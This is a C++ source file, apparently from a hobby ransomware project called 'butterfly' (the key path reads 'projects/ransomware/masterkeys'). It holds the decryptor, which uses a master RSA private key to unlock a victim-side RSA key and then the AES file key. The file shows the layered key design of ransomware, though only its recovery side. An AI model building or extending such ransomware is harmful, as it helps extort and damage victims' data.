
#include "crypto/decryptor.h"

namespace butterfly {

Decryptor::Decryptor() : _rsaDecryptorCPrivateRSA(new RSADecryptor("/home/christian/projects/ransomware/masterkeys/SPrivateRSA.pem")) {

}

Decryptor::~Decryptor() {

}

void Decryptor::decryptCPrivateRSA() {

    std::string encCPrivateRSA = _rsaDecryptorCPrivateRSA->getBinKeyFileContents("CPrivateRSA.bin");
    EVP_PKEY *cPrivateRSAPKey = _rsaDecryptorCPrivateRSA->getEvpPkey();

    if ( _rsaDecryptorCPrivateRSA->decrypt(cPrivateRSAPKey, encCPrivateRSA) ) {
        _decryptedCPrivateRSA = _rsaDecryptorCPrivateRSA->getDecryptedKey();
    }
    LOG_TRACE("Decrypted CPrivateRSA: " << _decryptedCPrivateRSA);
    decryptAESKey();
}

void Decryptor::decryptAESKey() {

    _rsaDecryptorAESKey = std::unique_ptr<RSADecryptor>(new RSADecryptor(_decryptedCPrivateRSA));

    std::string encAESKey = _rsaDecryptorAESKey->getBinKeyFileContents("AESKey.bin");
    EVP_PKEY *aesKeyPKey = _rsaDecryptorAESKey->getEvpPkey();

    if ( _rsaDecryptorAESKey->decrypt(aesKeyPKey, encAESKey) ) {
        _decryptedAESKey = _rsaDecryptorAESKey->getDecryptedKey();
    }
    LOG_TRACE("Decrypted AES Key: " << _decryptedAESKey);
}

} // namespace butterfly
